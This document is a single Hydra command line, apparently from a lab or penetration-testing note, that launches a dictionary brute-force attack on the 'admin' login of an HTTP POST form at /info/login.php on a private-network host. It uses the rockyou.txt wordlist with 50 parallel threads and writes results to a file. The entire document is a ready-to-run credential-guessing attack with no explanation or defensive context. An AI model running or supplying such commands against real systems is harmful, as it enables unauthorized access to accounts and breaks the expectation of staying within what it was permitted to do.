hydra -l admin -P ./rockyou.txt -t 50 -w 100 -o hydra-http-post-attack.txt 192.168.56.1 http-post-form "/info/login.php:login=^USER^&password=^PASS^:Wrong username or password"
